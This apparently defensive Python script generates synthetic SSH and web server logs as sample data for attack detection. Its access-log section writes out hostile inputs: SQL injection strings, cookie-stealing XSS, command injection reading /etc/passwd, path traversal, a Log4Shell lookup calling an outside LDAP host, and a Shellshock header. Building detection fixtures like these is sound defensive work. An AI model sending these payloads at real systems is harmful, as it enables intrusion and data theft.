"""Regenerate the bundled sample logs in ``samples/`` (deterministic).

All public-looking addresses come from the RFC 5737 documentation ranges
(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24), so no real host is implicated.

Usage: python scripts/generate_samples.py
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from urllib.parse import quote

OUT = Path(__file__).resolve().parent.parent / "samples"
rng = random.Random(2026)
WAT = timezone(timedelta(hours=1))  # West Africa Time

BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/129.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/129.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/17.6 Safari/605.1.15",
]
PAGES = [
    "/",
    "/about",
    "/services",
    "/contact",
    "/blog/",
    "/blog/secure-your-wordpress-site",
    "/blog/flutter-state-management",
    "/products.php?id=12",
    "/search?q=laptop+bag",
    "/assets/css/main.css",
    "/assets/js/app.js",
    "/images/hero.webp",
    "/favicon.ico",
]


# --------------------------------------------------------------------------- auth.log
def syslog(ts: datetime, msg: str, proc: str = "sshd") -> str:
    pid = rng.randint(1000, 65000)
    return f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S} web01 {proc}[{pid}]: {msg}"


def auth_log() -> list[str]:
    lines: list[tuple[datetime, str]] = []
    start = datetime(2026, 10, 5, 0, 0, 5)

    def add(ts: datetime, msg: str, proc: str = "sshd") -> None:
        lines.append((ts, syslog(ts, msg, proc)))

    # Background noise and legitimate admin activity.
    for h in range(0, 48, 1):
        ts = start + timedelta(hours=h, minutes=rng.randint(0, 50))
        add(ts, "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)", "CRON")
    for h in (8, 13, 17, 32, 37):
        ts = start + timedelta(hours=h, minutes=rng.randint(0, 40))
        port = rng.randint(40000, 60000)
        add(
            ts,
            f"Accepted publickey for deploy from 198.51.100.10 port {port} ssh2: "
            "ED25519 SHA256:k3y",
        )
        add(
            ts + timedelta(seconds=1),
            "pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)",
        )
        add(
            ts + timedelta(minutes=3),
            "deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; "
            "COMMAND=/usr/bin/systemctl reload nginx",
            "sudo",
        )
    ts = start + timedelta(hours=9, minutes=12)
    add(ts, "Accepted publickey for root from 198.51.100.10 port 51022 ssh2: RSA SHA256:r00t")

    # 1) Fast brute force against root/admin from 203.0.113.45 (40 attempts in ~6 minutes).
    t = start + timedelta(hours=2, minutes=14)
    for _ in range(40):
        user = rng.choice(["root", "root", "root", "admin", "ubuntu"])
        invalid = "invalid user " if user in {"admin"} else ""
        add(
            t,
            f"Failed password for {invalid}{user} from 203.0.113.45 port "
            f"{rng.randint(30000, 65000)} ssh2",
        )
        t += timedelta(seconds=rng.randint(5, 12))
    add(
        t,
        "error: maximum authentication attempts exceeded for root from 203.0.113.45 port "
        "41234 ssh2 [preauth]",
    )

    # 2) Username enumeration from 203.0.113.77.
    t = start + timedelta(hours=5, minutes=3)
    for user in [
        "oracle",
        "test",
        "postgres",
        "git",
        "ftpuser",
        "pi",
        "guest",
        "hadoop",
        "support",
    ]:
        port = rng.randint(30000, 65000)
        add(t, f"Invalid user {user} from 203.0.113.77 port {port}")
        add(
            t + timedelta(seconds=1),
            f"Failed password for invalid user {user} from 203.0.113.77 port {port} ssh2",
        )
        t += timedelta(seconds=rng.randint(20, 50))

    # 3) Slower brute force on 'deploy' that eventually succeeds: likely compromise.
    t = start + timedelta(hours=22, minutes=40)
    for _ in range(12):
        add(t, f"Failed password for deploy from 192.0.2.150 port {rng.randint(30000, 65000)} ssh2")
        t += timedelta(seconds=rng.randint(15, 35))
    add(t, "Accepted password for deploy from 192.0.2.150 port 52811 ssh2")
    add(
        t + timedelta(seconds=1),
        "pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)",
    )

    # 4) Distributed low-and-slow attack on 'admin' from many addresses.
    t = start + timedelta(hours=30)
    for i in range(7):
        ip = f"198.51.100.{60 + i}"
        add(
            t,
            f"Failed password for invalid user admin from {ip} "
            f"port {rng.randint(30000, 65000)} ssh2",
        )
        t += timedelta(minutes=rng.randint(9, 25))

    # 5) Port scanner noise.
    for i in range(3):
        add(
            start + timedelta(hours=11, minutes=i),
            "Did not receive identification string from 192.0.2.200 port 61000",
        )
    add(
        start + timedelta(hours=11, minutes=5),
        "Connection closed by authenticating user root 192.0.2.200 port 61002 [preauth]",
    )

    lines.sort(key=lambda x: x[0])
    return [line for _, line in lines]


# --------------------------------------------------------------------------- access logs
def clf(
    ip: str,
    ts: datetime,
    method: str,
    path: str,
    status: int,
    size: int,
    ua: str,
    referrer: str = "-",
) -> str:
    return (
        f'{ip} - - [{ts:%d/%b/%Y:%H:%M:%S %z}] "{method} {path} HTTP/1.1" {status} {size} '
        f'"{referrer}" "{ua}"'
    )


def access_log(nginx: bool = False) -> list[str]:
    out: list[tuple[datetime, str]] = []
    start = datetime(2026, 10, 6, 7, 0, 0, tzinfo=WAT)

    def add(
        ip: str,
        ts: datetime,
        method: str,
        path: str,
        status: int,
        ua: str,
        size: int | None = None,
        referrer: str = "-",
    ) -> None:
        out.append(
            (
                ts,
                clf(
                    ip,
                    ts,
                    method,
                    path,
                    status,
                    size if size is not None else rng.randint(300, 48000),
                    ua,
                    referrer,
                ),
            )
        )

    # Normal visitors.
    for _ in range(260 if not nginx else 120):
        ip = f"198.51.100.{rng.randint(11, 59)}"
        ts = start + timedelta(seconds=rng.randint(0, 12 * 3600))
        page = rng.choice(PAGES)
        status = rng.choices([200, 304, 404], weights=[88, 10, 2])[0]
        add(
            ip,
            ts,
            "GET",
            page,
            status,
            rng.choice(BROWSERS),
            referrer="https://www.google.com/" if rng.random() < 0.3 else "-",
        )

    if not nginx:
        # sqlmap SQL injection campaign.
        t = start + timedelta(hours=1, minutes=5)
        sqlmap_ua = "sqlmap/1.8.9#stable (https://sqlmap.org)"
        payloads = [
            "12' AND 1=1-- -",
            "12' OR '1'='1",
            "12 UNION ALL SELECT NULL,NULL,NULL-- -",
            "12' AND SLEEP(5)-- -",
            "12 AND (SELECT 1 FROM information_schema.tables)",
            "12'; DROP TABLE users-- -",
            "12' AND EXTRACTVALUE(1,CONCAT(0x5c,version()))-- -",
        ]
        for p in payloads * 2:
            add(
                "203.0.113.9",
                t,
                "GET",
                f"/products.php?id={quote(p)}",
                rng.choice([200, 500]),
                sqlmap_ua,
            )
            t += timedelta(seconds=rng.randint(1, 4))

        # Directory brute force with gobuster plus sensitive file probes.
        t = start + timedelta(hours=3, minutes=20)
        words = [
            "admin",
            "backup",
            "old",
            "test",
            "dev",
            "staging",
            "api",
            "uploads",
            "cgi-bin",
            "config",
            "db",
            "logs",
            "tmp",
            "private",
            "panel",
            "cpanel",
            "webmail",
            "shop",
            "install",
            "setup",
            "server",
            "data",
            "files",
            "assets2",
            "portal",
            "secret",
            "hidden",
            "beta",
            "v1",
            "v2",
            "console",
            "manager",
            "dashboard",
            "login2",
            "include",
            "inc",
            "lib",
            "src",
            "vendor",
            "node_modules",
        ]
        for w in words:
            add("203.0.113.21", t, "GET", f"/{w}/", 404, "gobuster/3.6", size=196)
            t += timedelta(seconds=rng.randint(1, 3))
        for path, status in [
            ("/.env", 404),
            ("/.git/config", 403),
            ("/backup.sql", 404),
            ("/wp-config.php.bak", 404),
            ("/phpmyadmin/", 404),
            ("/server-status", 403),
        ]:
            add("203.0.113.21", t, "GET", path, status, "gobuster/3.6", size=196)
            t += timedelta(seconds=2)

        # XSS and command injection.
        t = start + timedelta(hours=4, minutes=2)
        xss = [
            "<script>alert(1)</script>",
            '"><img src=x onerror=alert(document.cookie)>',
            "<svg/onload=alert('xss')>",
            "javascript:alert(1)",
        ]
        for p in xss:
            add("192.0.2.66", t, "GET", f"/search?q={quote(quote(p))}", 200, BROWSERS[0])
            t += timedelta(seconds=20)
        add(
            "192.0.2.66",
            t,
            "GET",
            f"/cgi-bin/ping.cgi?host={quote('127.0.0.1;cat /etc/passwd')}",
            404,
            "curl/8.5.0",
        )

        # Path traversal / LFI.
        t = start + timedelta(hours=6, minutes=45)
        for p in [
            "../../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "php://filter/convert.base64-encode/resource=index.php",
            "....//....//etc/shadow",
            "..\\..\\windows\\win.ini",
        ]:
            add(
                "192.0.2.88",
                t,
                "GET",
                f"/download.php?file={p}",
                rng.choice([400, 403, 200]),
                "python-requests/2.32.3",
            )
            t += timedelta(seconds=7)

        # WordPress login brute force.
        t = start + timedelta(hours=8, minutes=10)
        for _ in range(34):
            add("198.51.100.200", t, "POST", "/wp-login.php", 200, BROWSERS[3], size=4321)
            t += timedelta(seconds=rng.randint(2, 6))
        for _ in range(6):
            add("198.51.100.200", t, "POST", "/xmlrpc.php", 200, BROWSERS[3], size=403)
            t += timedelta(seconds=3)

        # Log4Shell and Shellshock probes in headers.
        t = start + timedelta(hours=9, minutes=31)
        add("203.0.113.130", t, "GET", "/", 200, "${jndi:ldap://203.0.113.130:1389/Exploit}")
        add(
            "203.0.113.130",
            t + timedelta(seconds=3),
            "GET",
            "/?x=${${lower:j}ndi:dns://x.example}",
            200,
            BROWSERS[1],
        )
        add(
            "203.0.113.130",
            t + timedelta(seconds=6),
            "GET",
            "/cgi-bin/status",
            404,
            "() { :; }; /bin/bash -c 'cat /etc/passwd'",
        )
    else:
        t = start + timedelta(hours=2)
        nikto = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000003)"
        for path in [
            "/admin.php",
            "/login.php",
            "/phpinfo.php",
            "/test.php",
            "/info.php",
            "/.htpasswd",
            "/config.json",
            "/shell.php",
            "/cmd.php",
            "/wp-admin/",
            "/manager/html",
            "/console",
            "/actuator/env",
            "/debug",
            "/status",
            "/backup.zip",
            "/db.sql",
            "/old/",
            "/temp/",
            "/.DS_Store",
        ]:
            add("192.0.2.33", t, "GET", path, 404, nikto, size=153)
            t += timedelta(seconds=1)
        add("192.0.2.33", t, "GET", "/index.php?page=../../../etc/passwd", 200, nikto)
        t = start + timedelta(hours=5)
        out.append(
            (
                t,
                f"203.0.113.250 - - [{t:%d/%b/%Y:%H:%M:%S %z}] "
                '"\\x16\\x03\\x01\\x00\\xfa\\x01\\x00\\x00\\xf6\\x03\\x03" 400 157 "-" "-"',
            )
        )
        for i in range(12):
            add(
                "203.0.113.88",
                t + timedelta(seconds=i * 9),
                "POST",
                "/user/login",
                401,
                "python-requests/2.32.3",
            )

    out.sort(key=lambda x: x[0])
    return [line for _, line in out]


def main() -> None:
    OUT.mkdir(exist_ok=True)
    (OUT / "auth.log").write_text("\n".join(auth_log()) + "\n", encoding="utf-8")
    (OUT / "access.log").write_text("\n".join(access_log()) + "\n", encoding="utf-8")
    (OUT / "nginx_access.log").write_text(
        "\n".join(access_log(nginx=True)) + "\n", encoding="utf-8"
    )
    for name in ("auth.log", "access.log", "nginx_access.log"):
        print(f"wrote samples/{name}: {len((OUT / name).read_text().splitlines())} lines")


if __name__ == "__main__":
    main()
